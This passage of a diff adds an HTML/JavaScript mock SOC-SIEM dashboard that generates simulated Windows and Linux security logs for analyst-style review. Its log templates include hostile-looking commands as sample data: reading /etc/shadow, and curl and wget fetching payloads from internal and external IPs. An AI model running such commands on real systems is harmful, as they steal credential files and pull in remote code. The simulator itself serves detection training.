@@ -1,0 +1,1143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src 'none'; connect-src 'none'; form-action 'none'; base-uri 'none';">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC-SIEM | Log Management Platform</title>
+<style>
+/* ── WAZUH/SPLUNK INSPIRED DESIGN ─────────────────────────────────────────── */
+:root {
+  --bg: #0f1117;
+  --sidebar: #161b26;
+  --panel: #1c2333;
+  --panel2: #212840;
+  --border: #2d3748;
+  --accent: #3b82f6;
+  --accent2: #60a5fa;
+  --red: #ef4444;
+  --orange: #f97316;
+  --yellow: #eab308;
+  --green: #22c55e;
+  --purple: #a855f7;
+  --cyan: #06b6d4;
+  --text: #e2e8f0;
+  --dim: #64748b;
+  --dim2: #94a3b8;
+  --mono: 'Courier New', monospace;
+  --sans: -apple-system, 'Segoe UI', sans-serif;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 13px; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+
+/* ── TOPBAR ── */
+.topbar {
+  background: var(--sidebar);
+  border-bottom: 1px solid var(--border);
+  padding: 0 16px;
+  height: 48px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  flex-shrink: 0;
+  z-index: 100;
+}
+.logo-area { display: flex; align-items: center; gap: 10px; }
+.logo-icon { width: 28px; height: 28px; background: var(--accent); border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 900; color: white; }
+.logo-text { font-size: 15px; font-weight: 700; color: var(--text); letter-spacing: -.3px; }
+.logo-text span { color: var(--accent2); }
+.logo-ver { font-size: 10px; color: var(--dim); background: var(--panel); padding: 1px 6px; border-radius: 4px; border: 1px solid var(--border); }
+.topbar-search { flex: 1; max-width: 480px; }
+.search-wrap { display: flex; align-items: center; gap: 6px; background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 5px 10px; }
+.search-wrap:focus-within { border-color: var(--accent); }
+.search-icon { color: var(--dim); font-size: 12px; }
+.search-input { background: none; border: none; color: var(--text); font-size: 12px; outline: none; flex: 1; }
+.search-input::placeholder { color: var(--dim); }
+.search-kbd { font-size: 10px; color: var(--dim); background: var(--sidebar); border: 1px solid var(--border); border-radius: 3px; padding: 1px 4px; font-family: var(--mono); }
+.topbar-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+.tbar-btn { padding: 5px 12px; border-radius: 5px; font-size: 11px; cursor: pointer; font-family: var(--sans); border: 1px solid var(--border); background: var(--panel); color: var(--dim2); transition: all .2s; }
+.tbar-btn:hover { border-color: var(--accent); color: var(--accent2); }
+.tbar-btn.primary { background: var(--accent); border-color: var(--accent); color: white; font-weight: 600; }
+.tbar-btn.primary:hover { background: #2563eb; }
+.live-indicator { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--green); font-weight: 600; }
+.live-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); animation: pulse 1.4s infinite; }
+@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(.8)} }
+#clock { font-size: 11px; color: var(--dim2); font-family: var(--mono); }
+
+/* ── MAIN LAYOUT ── */
+.app-body { flex: 1; display: flex; overflow: hidden; }
+
+/* ── LEFT SIDEBAR ── */
+.sidebar { width: 220px; background: var(--sidebar); border-right: 1px solid var(--border); display: flex; flex-direction: column; flex-shrink: 0; overflow-y: auto; }
+.sidebar-section { padding: 12px 8px 4px; }
+.sidebar-section-label { font-size: 10px; font-weight: 600; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; padding: 0 8px; margin-bottom: 4px; }
+.nav-item { display: flex; align-items: center; gap: 8px; padding: 7px 8px; border-radius: 6px; cursor: pointer; transition: all .15s; color: var(--dim2); font-size: 12px; font-weight: 500; }
+.nav-item:hover { background: rgba(255,255,255,.05); color: var(--text); }
+.nav-item.active { background: rgba(59,130,246,.15); color: var(--accent2); }
+.nav-item .ni-icon { width: 16px; text-align: center; font-size: 13px; }
+.nav-item .ni-badge { margin-left: auto; background: var(--red); color: white; border-radius: 8px; padding: 1px 6px; font-size: 10px; font-weight: 700; }
+.nav-item .ni-badge.orange { background: var(--orange); }
+.nav-item .ni-badge.dim { background: var(--panel2); color: var(--dim2); }
+.sidebar-divider { border-top: 1px solid var(--border); margin: 8px 0; }
+
+/* ── MAIN AREA ── */
+.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+
+/* ── SUB-TABS ── */
+.sub-tabs { background: var(--panel); border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 2px; padding: 0 16px; flex-shrink: 0; }
+.sub-tab { padding: 10px 14px; font-size: 12px; color: var(--dim2); cursor: pointer; border-bottom: 2px solid transparent; transition: all .2s; }
+.sub-tab:hover { color: var(--text); }
+.sub-tab.active { color: var(--accent2); border-bottom-color: var(--accent); }
+.sub-tabs-right { margin-left: auto; display: flex; gap: 6px; align-items: center; padding: 6px 0; }
+
+/* ── PAGE AREAS ── */
+.page { display: none; flex: 1; overflow: hidden; flex-direction: column; }
+.page.active { display: flex; }
+
+/* ── OVERVIEW / DASHBOARD ── */
+.overview-wrap { overflow-y: auto; flex: 1; padding: 14px; }
+.stats-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 10px; margin-bottom: 14px; }
+.stat-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 14px; display: flex; align-items: center; gap: 12px; }
+.stat-icon { width: 38px; height: 38px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+.stat-data .stat-val { font-size: 22px; font-weight: 700; line-height: 1; }
+.stat-data .stat-lbl { font-size: 11px; color: var(--dim2); margin-top: 3px; }
+.stat-data .stat-trend { font-size: 10px; margin-top: 4px; }
+.trend-up { color: var(--red); }
+.trend-dn { color: var(--green); }
+
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px; }
+.three-col { display: grid; grid-template-columns: 2fr 1fr; gap: 10px; }
+
+.card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+.card-header { padding: 10px 14px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+.card-title { font-size: 12px; font-weight: 600; color: var(--text); }
+.card-badge { font-size: 10px; padding: 2px 7px; border-radius: 4px; }
+.badge-red { background: rgba(239,68,68,.15); color: var(--red); border: 1px solid rgba(239,68,68,.3); }
+.badge-green { background: rgba(34,197,94,.12); color: var(--green); border: 1px solid rgba(34,197,94,.25); }
+.badge-blue { background: rgba(59,130,246,.12); color: var(--accent2); border: 1px solid rgba(59,130,246,.25); }
+.badge-dim { background: var(--panel2); color: var(--dim2); border: 1px solid var(--border); }
+
+/* ── LOG VIEWER ── */
+.log-viewer-wrap { display: flex; flex: 1; overflow: hidden; }
+.log-sidebar { width: 220px; border-right: 1px solid var(--border); display: flex; flex-direction: column; background: var(--panel); flex-shrink: 0; }
+.log-sidebar-header { padding: 8px 10px; border-bottom: 1px solid var(--border); font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: var(--dim); }
+.source-item { padding: 8px 10px; border-bottom: 1px solid rgba(45,55,72,.5); cursor: pointer; transition: background .15s; display: flex; align-items: center; gap: 8px; }
+.source-item:hover { background: rgba(255,255,255,.03); }
+.source-item.active { background: rgba(59,130,246,.1); border-left: 2px solid var(--accent); }
+.source-name { font-size: 12px; font-weight: 500; }
+.source-count { margin-left: auto; font-size: 10px; color: var(--dim); font-family: var(--mono); }
+.source-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+
+.log-main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+.log-toolbar { padding: 8px 12px; background: var(--panel2); border-bottom: 1px solid var(--border); display: flex; gap: 8px; align-items: center; flex-shrink: 0; }
+.log-filter-input { background: var(--panel); border: 1px solid var(--border); color: var(--text); padding: 5px 8px; border-radius: 5px; font-size: 11px; font-family: var(--mono); flex: 1; }
+.log-filter-input:focus { outline: none; border-color: var(--accent); }
+.sev-filter-btn { padding: 4px 10px; border-radius: 4px; font-size: 10px; font-weight: 600; cursor: pointer; border: 1px solid; transition: all .2s; }
+.sfb-all { border-color: var(--border); color: var(--dim2); background: transparent; }
+.sfb-all.active, .sfb-all:hover { background: var(--panel2); color: var(--text); }
+.sfb-crit { border-color: rgba(239,68,68,.3); color: var(--red); background: transparent; }
+.sfb-crit.active { background: rgba(239,68,68,.1); }
+.sfb-high { border-color: rgba(249,115,22,.3); color: var(--orange); background: transparent; }
+.sfb-high.active { background: rgba(249,115,22,.1); }
+.sfb-med { border-color: rgba(234,179,8,.3); color: var(--yellow); background: transparent; }
+.sfb-med.active { background: rgba(234,179,8,.1); }
+.sfb-info { border-color: rgba(34,197,94,.3); color: var(--green); background: transparent; }
+.sfb-info.active { background: rgba(34,197,94,.1); }
+
+.log-table-wrap { overflow-y: auto; flex: 1; }
+.log-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 11px; }
+.log-table thead th { position: sticky; top: 0; background: var(--panel2); padding: 6px 8px; text-align: left; font-size: 10px; text-transform: uppercase; letter-spacing: .8px; color: var(--dim); font-family: var(--sans); font-weight: 600; border-bottom: 1px solid var(--border); }
+.log-table tbody tr { border-bottom: 1px solid rgba(45,55,72,.4); cursor: pointer; transition: background .1s; }
+.log-table tbody tr:hover { background: rgba(255,255,255,.03); }
+.log-table tbody tr.selected { background: rgba(59,130,246,.08); }
+.log-table td { padding: 6px 8px; vertical-align: top; }
+.log-sev { font-weight: 700; font-size: 10px; padding: 2px 5px; border-radius: 3px; white-space: nowrap; }
+.lsev-CRITICAL { background: rgba(239,68,68,.2); color: var(--red); }
+.lsev-HIGH { background: rgba(249,115,22,.15); color: var(--orange); }
+.lsev-MEDIUM { background: rgba(234,179,8,.12); color: var(--yellow); }
+.lsev-LOW { background: rgba(34,197,94,.1); color: var(--green); }
+.lsev-INFO { background: rgba(59,130,246,.1); color: var(--accent2); }
+.log-msg { color: var(--text); max-width: 500px; }
+.log-msg .hl { color: var(--red); font-weight: bold; }
+.log-ts { color: var(--dim); white-space: nowrap; }
+.log-host { color: var(--cyan); }
+.log-eid { color: var(--purple); }
+
+/* ── EVENT DETAIL PANEL ── */
+.detail-panel { width: 360px; border-left: 1px solid var(--border); background: var(--panel); display: flex; flex-direction: column; overflow: hidden; flex-shrink: 0; }
+.detail-header { padding: 10px 12px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+.detail-title { font-size: 12px; font-weight: 600; }
+.detail-close { color: var(--dim); cursor: pointer; padding: 2px 6px; border-radius: 3px; }
+.detail-close:hover { color: var(--text); background: var(--panel2); }
+.detail-body { overflow-y: auto; flex: 1; padding: 12px; }
+.detail-row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid rgba(45,55,72,.5); gap: 8px; }
+.detail-row:last-child { border: none; }
+.detail-key { font-size: 11px; color: var(--dim2); min-width: 110px; flex-shrink: 0; }
+.detail-val { font-size: 11px; font-family: var(--mono); text-align: right; word-break: break-all; }
+.raw-log-box { background: var(--bg); border: 1px solid var(--border); border-radius: 5px; padding: 10px; font-family: var(--mono); font-size: 10px; line-height: 1.6; margin-top: 10px; white-space: pre-wrap; word-break: break-all; color: var(--dim2); }
+.raw-log-box .hl { color: var(--orange); }
+
+/* ── EVENT ID REFERENCE ── */
+.eid-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 14px; overflow-y: auto; flex: 1; }
+.eid-card { background: var(--panel); border: 1px solid var(--border); border-radius: 7px; padding: 12px; cursor: pointer; transition: border-color .2s; }
+.eid-card:hover { border-color: var(--accent); }
+.eid-num { font-size: 18px; font-weight: 800; font-family: var(--mono); margin-bottom: 4px; }
+.eid-name { font-size: 12px; font-weight: 600; margin-bottom: 4px; }
+.eid-desc { font-size: 11px; color: var(--dim2); line-height: 1.5; }
+.eid-risk { font-size: 10px; padding: 2px 7px; border-radius: 4px; display: inline-block; margin-top: 6px; }
+
+/* ── LOG SOURCES MAP ── */
+.sources-layout { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 14px; overflow-y: auto; }
+.source-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+.source-card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+.source-card-icon { width: 36px; height: 36px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+.source-card h3 { font-size: 13px; font-weight: 600; }
+.source-card .sc-sub { font-size: 11px; color: var(--dim2); margin-top: 2px; }
+.log-path { background: var(--bg); border: 1px solid var(--border); border-radius: 4px; padding: 4px 8px; font-family: var(--mono); font-size: 10px; color: var(--cyan); margin: 4px 0; }
+.log-events-list { margin-top: 8px; }
+.log-event-item { font-size: 11px; padding: 3px 0; border-bottom: 1px solid rgba(45,55,72,.4); color: var(--dim2); display: flex; gap: 6px; align-items: center; }
+.log-event-item::before { content: ''; width: 5px; height: 5px; border-radius: 50%; background: var(--dim); flex-shrink: 0; }
+
+/* ── INCIDENT BUILDER ── */
+.incident-layout { display: grid; grid-template-columns: 340px 1fr; height: 100%; overflow: hidden; }
+.incident-left { border-right: 1px solid var(--border); display: flex; flex-direction: column; overflow: hidden; }
+.incident-list { overflow-y: auto; flex: 1; }
+.inc-item { padding: 10px 12px; border-bottom: 1px solid rgba(45,55,72,.5); cursor: pointer; transition: background .15s; }
+.inc-item:hover { background: rgba(255,255,255,.03); }
+.inc-item.selected { background: rgba(59,130,246,.08); border-left: 2px solid var(--accent); }
+.inc-header { display: flex; align-items: flex-start; gap: 8px; margin-bottom: 4px; }
+.inc-sev { font-size: 9px; font-weight: 700; padding: 2px 5px; border-radius: 3px; flex-shrink: 0; margin-top: 1px; }
+.inc-title { font-size: 12px; font-weight: 600; line-height: 1.3; }
+.inc-meta { display: flex; gap: 10px; font-size: 10px; color: var(--dim); }
+.inc-meta .inc-rule { color: var(--purple); }
+.inc-right { display: flex; flex-direction: column; overflow: hidden; }
+.inc-detail-area { overflow-y: auto; flex: 1; padding: 16px; }
+.inc-timeline { margin-top: 10px; }
+.it-item { display: flex; gap: 12px; padding: 6px 0; border-left: 2px solid var(--border); padding-left: 16px; position: relative; margin-left: 8px; }
+.it-item::before { content: ''; position: absolute; left: -5px; top: 12px; width: 8px; height: 8px; border-radius: 50%; background: var(--accent); }
+.it-item.alert-step::before { background: var(--red); }
+.it-time { color: var(--dim); font-size: 10px; min-width: 65px; font-family: var(--mono); }
+.it-text { font-size: 11px; line-height: 1.5; }
+.it-code { font-family: var(--mono); font-size: 10px; background: var(--bg); border: 1px solid var(--border); border-radius: 3px; padding: 4px 8px; margin-top: 4px; color: var(--cyan); }
+
+/* ── OVERVIEW WIDGETS ── */
+.log-rate-bars { padding: 10px 14px; }
+.lrb-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+.lrb-label { min-width: 120px; font-size: 11px; color: var(--dim2); }
+.lrb-track { flex: 1; background: var(--border); border-radius: 3px; height: 12px; overflow: hidden; }
+.lrb-fill { height: 100%; border-radius: 3px; }
+.lrb-val { min-width: 40px; font-size: 11px; font-family: var(--mono); color: var(--dim2); text-align: right; }
+.event-type-list { padding: 10px 14px; }
+.etl-row { display: flex; align-items: center; padding: 6px 0; border-bottom: 1px solid rgba(45,55,72,.4); }
+.etl-dot { width: 8px; height: 8px; border-radius: 50%; margin-right: 8px; flex-shrink: 0; }
+.etl-name { flex: 1; font-size: 12px; }
+.etl-count { font-size: 11px; font-family: var(--mono); color: var(--dim2); }
+.etl-pct { font-size: 10px; color: var(--dim); margin-left: 8px; min-width: 32px; text-align: right; }
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--dim); }
+</style>
+</head>
+<body>
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="logo-area">
+    <div class="logo-icon">S</div>
+    <div class="logo-text">SOC<span>-SIEM</span></div>
+    <div class="logo-ver">v4.2.1</div>
+  </div>
+  <div class="topbar-search">
+    <div class="search-wrap">
+      <span class="search-icon">&#128269;</span>
+      <input class="search-input" id="global-search" placeholder="Search logs, events, hostnames... (e.g. EventID:4625 OR src_ip:192.168.1.55)" oninput="globalSearch()">
+      <span class="search-kbd">KQL</span>
+    </div>
+  </div>
+  <div class="topbar-right">
+    <div class="live-indicator"><span class="live-dot"></span>LIVE</div>
+    <select style="background:var(--panel);border:1px solid var(--border);color:var(--dim2);padding:4px 8px;border-radius:5px;font-size:11px;" id="time-range" onchange="refreshData()">
+      <option value="15m">Last 15 min</option>
+      <option value="1h" selected>Last 1 hour</option>
+      <option value="24h">Last 24 hours</option>
+      <option value="7d">Last 7 days</option>
+    </select>
+    <button class="tbar-btn">&#9881; Settings</button>
+    <button class="tbar-btn primary" onclick="addEvent()">+ Add Manual Event</button>
+    <span id="clock"></span>
+  </div>
+</div>
+
+<div class="app-body">
+  <!-- LEFT SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Overview</div>
+      <div class="nav-item active" onclick="switchPage('overview',this)">
+        <span class="ni-icon">&#128202;</span> Dashboard
+      </div>
+      <div class="nav-item" onclick="switchPage('alerts',this)">
+        <span class="ni-icon">&#128680;</span> Active Alerts
+        <span class="ni-badge" id="nb-alerts">0</span>
+      </div>
+    </div>
+    <div class="sidebar-divider"></div>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Log Management</div>
+      <div class="nav-item" onclick="switchPage('logviewer',this)">
+        <span class="ni-icon">&#128196;</span> Log Viewer
+        <span class="ni-badge dim" id="nb-logs">0</span>
+      </div>
+      <div class="nav-item" onclick="switchPage('sources',this)">
+        <span class="ni-icon">&#128225;</span> Log Sources
+      </div>
+      <div class="nav-item" onclick="switchPage('eventids',this)">
+        <span class="ni-icon">&#128269;</span> Event ID Reference
+      </div>
+    </div>
+    <div class="sidebar-divider"></div>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Incidents</div>
+      <div class="nav-item" onclick="switchPage('incidents',this)">
+        <span class="ni-icon">&#128203;</span> Incident Queue
+        <span class="ni-badge orange" id="nb-inc">0</span>
+      </div>
+    </div>
+    <div class="sidebar-divider"></div>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Sources</div>
+      <div class="nav-item" style="padding-left:16px">
+        <span class="source-dot" style="background:var(--green)"></span>
+        <span>Windows Logs</span>
+        <span class="source-count" id="sb-win">0</span>
+      </div>
+      <div class="nav-item" style="padding-left:16px">
+        <span class="source-dot" style="background:var(--orange)"></span>
+        <span>Linux Syslog</span>
+        <span class="source-count" id="sb-linux">0</span>
+      </div>
+      <div class="nav-item" style="padding-left:16px">
+        <span class="source-dot" style="background:var(--cyan)"></span>
+        <span>Firewall</span>
+        <span class="source-count" id="sb-fw">0</span>
+      </div>
+      <div class="nav-item" style="padding-left:16px">
+        <span class="source-dot" style="background:var(--purple)"></span>
+        <span>IDS/IPS</span>
+        <span class="source-count" id="sb-ids">0</span>
+      </div>
+      <div class="nav-item" style="padding-left:16px">
+        <span class="source-dot" style="background:var(--red)"></span>
+        <span>Web Server</span>
+        <span class="source-count" id="sb-web">0</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="main">
+    <!-- SUB-TAB BAR -->
+    <div class="sub-tabs" id="sub-tabs-bar">
+      <div class="sub-tab active" id="tab-main">Overview</div>
+      <div class="sub-tabs-right">
+        <button class="tbar-btn" onclick="exportLogs()">&#128190; Export</button>
+        <button class="tbar-btn" onclick="refreshData()">&#8635; Refresh</button>
+      </div>
+    </div>
+
+    <!-- PAGE: DASHBOARD -->
+    <div class="page active" id="page-overview">
+      <div class="overview-wrap" id="overview-wrap">
+        <!-- Stats row -->
+        <div class="stats-grid" id="stats-grid"></div>
+        <!-- Charts row -->
+        <div class="two-col" style="margin-bottom:10px">
+          <div class="card">
+            <div class="card-header">
+              <span class="card-title">Log Ingestion Rate — by Source</span>
+              <span class="card-badge badge-blue">Events/min</span>
+            </div>
+            <div class="log-rate-bars" id="rate-bars"></div>
+          </div>
+          <div class="card">
+            <div class="card-header">
+              <span class="card-title">Event Type Distribution</span>
+              <span class="card-badge badge-dim" id="total-events-badge">0 events</span>
+            </div>
+            <div class="event-type-list" id="event-type-list"></div>
+          </div>
+        </div>
+        <!-- Recent alerts -->
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">Recent Security Events</span>
+            <span class="card-badge badge-red" id="recent-badge">0 alerts</span>
+          </div>
+          <div id="recent-events-list"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: LOG VIEWER -->
+    <div class="page" id="page-logviewer">
+      <div class="log-viewer-wrap">
+        <div class="log-sidebar">
+          <div class="log-sidebar-header">Log Sources</div>
+          <div id="log-source-list"></div>
+        </div>
+        <div class="log-main">
+          <div class="log-toolbar">
+            <input class="log-filter-input" id="log-filter" placeholder="Filter: e.g.  EventID:4625  OR  host:WS-FINANCE  OR  severity:CRITICAL" oninput="filterLogs()">
+            <span class="sev-filter-btn sfb-all active" onclick="setSevFilter('ALL',this)">ALL</span>
+            <span class="sev-filter-btn sfb-crit" onclick="setSevFilter('CRITICAL',this)">CRIT</span>
+            <span class="sev-filter-btn sfb-high" onclick="setSevFilter('HIGH',this)">HIGH</span>
+            <span class="sev-filter-btn sfb-med" onclick="setSevFilter('MEDIUM',this)">MED</span>
+            <span class="sev-filter-btn sfb-info" onclick="setSevFilter('INFO',this)">INFO</span>
+            <span style="font-size:11px;color:var(--dim);margin-left:4px" id="log-count-label">0 events</span>
+          </div>
+          <div class="log-table-wrap">
+            <table class="log-table">
+              <thead><tr>
+                <th style="width:130px">Timestamp</th>
+                <th style="width:65px">Severity</th>
+                <th style="width:75px">Event ID</th>
+                <th style="width:100px">Host</th>
+                <th style="width:90px">Source</th>
+                <th>Message</th>
+              </tr></thead>
+              <tbody id="log-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+        <div class="detail-panel" id="detail-panel">
+          <div class="detail-header">
+            <span class="detail-title">Event Details</span>
+            <span class="detail-close" onclick="clearDetail()">&#10005;</span>
+          </div>
+          <div class="detail-body" id="detail-body">
+            <div style="color:var(--dim);text-align:center;padding:30px;font-size:12px">Click any log entry to view full event details</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: LOG SOURCES -->
+    <div class="page" id="page-sources">
+      <div class="sources-layout" id="sources-grid"></div>
+    </div>
+
+    <!-- PAGE: EVENT ID REFERENCE -->
+    <div class="page" id="page-eventids">
+      <div style="padding:12px 14px;border-bottom:1px solid var(--border);background:var(--panel2);flex-shrink:0;display:flex;gap:8px;align-items:center">
+        <span style="font-size:12px;color:var(--dim2)">Critical Windows Event IDs for SOC Analysts — click any card to see detection guidance</span>
+        <select id="eid-os-filter" onchange="renderEventIds()" style="background:var(--panel);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:5px;font-size:11px;margin-left:auto">
+          <option value="ALL">All Platforms</option>
+          <option value="Windows">Windows Only</option>
+          <option value="Linux">Linux Only</option>
+        </select>
+      </div>
+      <div class="eid-grid" id="eid-grid"></div>
+    </div>
+
+    <!-- PAGE: INCIDENTS -->
+    <div class="page" id="page-incidents">
+      <div class="incident-layout">
+        <div class="incident-left">
+          <div class="log-sidebar-header" style="padding:10px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">
+            <span>Incident Queue</span>
+            <span class="card-badge badge-red" id="inc-total-badge">0 open</span>
+          </div>
+          <div class="incident-list" id="incident-list"></div>
+        </div>
+        <div class="inc-right">
+          <div class="card-header" style="background:var(--panel2);border-bottom:1px solid var(--border)">
+            <span class="detail-title" id="inc-detail-title">Select an incident</span>
+            <div style="display:flex;gap:6px">
+              <button class="tbar-btn" onclick="escalateInc()">&#8679; Escalate</button>
+              <button class="tbar-btn" onclick="closeInc()">&#10003; Close</button>
+            </div>
+          </div>
+          <div class="inc-detail-area" id="inc-detail-area">
+            <div style="color:var(--dim);text-align:center;padding:40px;font-size:12px">Select an incident from the queue to view details, evidence, and timeline</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: ALERTS -->
+    <div class="page" id="page-alerts">
+      <div style="overflow-y:auto;flex:1;padding:14px">
+        <div id="alerts-list"></div>
+      </div>
+    </div>
+
+  </div><!-- /main -->
+</div><!-- /app-body -->
+
+<script>
+// ── SAFETY: HTML escape ───────────────────────────────────────────────────────
+function e(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
+
+// ── CLOCK ─────────────────────────────────────────────────────────────────────
+setInterval(()=>document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-GB')+' UTC',1000);
+
+// ── PAGE NAVIGATION ───────────────────────────────────────────────────────────
+function switchPage(id,el){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById('page-'+id).classList.add('active');
+  if(el) el.classList.add('active');
+  const titles={overview:'Overview',logviewer:'Log Viewer',sources:'Log Sources',eventids:'Event ID Reference',incidents:'Incident Queue',alerts:'Active Alerts'};
+  const tab=document.getElementById('tab-main');
+  if(tab) tab.textContent=titles[id]||id;
+}
+
+// ── CORE DATA ─────────────────────────────────────────────────────────────────
+function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
+function pick(arr){return arr[rnd(0,arr.length-1)];}
+function ts(offsetMin=0){
+  const d=new Date(Date.now()-offsetMin*60000);
+  return d.toISOString().replace('T',' ').slice(0,19);
+}
+
+const HOSTS=['WS-FINANCE-01','WS-HR-03','SRV-DC-01','SRV-FILE-01','WS-DEV-05','WS-EXEC-01','SRV-WEB-01','WS-IT-02','LAPTOP-CFO-01'];
+const IPS_INT=['192.168.1.15','192.168.1.22','192.168.1.5','192.168.1.10','192.168.1.31','192.168.1.20','192.168.1.8'];
+const IPS_EXT=['185.220.101.5','45.142.212.100','185.234.218.48','203.0.113.55','91.108.4.1'];
+const USERS=['jsmith','mwilson','dchen','slee','rzhan','ejohnson','SYSTEM','LOCAL SERVICE','NETWORK SERVICE'];
+
+const LOG_TEMPLATES=[
+  {source:'Windows Security',eid:'4625',sev:'HIGH',   host:()=>pick(HOSTS),msg:()=>'An account failed to log on. Account: '+pick(USERS)+' Source IP: '+pick(IPS_INT)+' Logon Type: 3 Failure: 0xC0000064'},
+  {source:'Windows Security',eid:'4648',sev:'HIGH',   host:()=>pick(HOSTS),msg:()=>'A logon was attempted using explicit credentials. Target: '+pick(HOSTS)+' User: '+pick(USERS)+' Process: lsass.exe'},
+  {source:'Windows Security',eid:'4688',sev:'MEDIUM', host:()=>pick(HOSTS),msg:()=>'A new process has been created. Process: powershell.exe Parent: '+pick(['cmd.exe','winword.exe','explorer.exe'])+' User: '+pick(USERS)},
+  {source:'Windows Security',eid:'4698',sev:'HIGH',   host:()=>pick(HOSTS),msg:()=>'A scheduled task was created. Task: \\Microsoft\\Windows\\'+pick(['SvcHlp','UpdateHelper','Maintenance'])+' User: '+pick(USERS)},
+  {source:'Windows Security',eid:'4720',sev:'HIGH',   host:()=>pick(HOSTS),msg:()=>'A user account was created. New Account: '+pick(['svc_backup','admin_temp','helpdesk01'])+' Creator: '+pick(USERS)},
+  {source:'Windows Security',eid:'4732',sev:'CRITICAL',host:()=>pick(HOSTS),msg:()=>'A member was added to a security-enabled local group. Group: Administrators Member: '+pick(USERS)},
+  {source:'Windows Security',eid:'1102',sev:'CRITICAL',host:()=>pick(HOSTS),msg:()=>'The audit log was cleared. Subject: '+pick(USERS)+' Logon ID: 0x'+rnd(100000,999999).toString(16).toUpperCase()},
+  {source:'Windows System',  eid:'7045',sev:'HIGH',   host:()=>pick(HOSTS),msg:()=>'A new service was installed. Service Name: '+pick(['WinSvc32','SvcHlp64','NetSvc'])+' File: C:\\Windows\\Temp\\'+pick(['svc.exe','update.exe','helper.exe'])},
+  {source:'Windows Security',eid:'4624',sev:'INFO',   host:()=>pick(HOSTS),msg:()=>'An account was successfully logged on. Account: '+pick(USERS)+' Logon Type: 3 Source IP: '+pick(IPS_INT)},
+  {source:'Linux Auth',      eid:'sshd', sev:'HIGH',  host:()=>pick(['SRV-WEB-01','SRV-FILE-01','SRV-DC-01']),msg:()=>'Failed password for '+pick(USERS)+' from '+pick(IPS_EXT)+' port '+rnd(40000,60000)+' ssh2'},
+  {source:'Linux Auth',      eid:'sudo', sev:'MEDIUM',host:()=>pick(['SRV-WEB-01','SRV-FILE-01']),msg:()=>pick(USERS)+' : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND='+pick(['/bin/bash','/usr/bin/cat /etc/shadow','/bin/chmod 777 /var/www'])},
+  {source:'Linux Syslog',    eid:'cron', sev:'INFO',  host:()=>pick(['SRV-WEB-01','SRV-DC-01']),msg:()=>'('+pick(USERS)+') CMD ('+pick(['/usr/bin/python3 /tmp/update.py','curl http://192.168.1.99/payload','wget -O /tmp/x http://'+pick(IPS_EXT)])+')'}, 
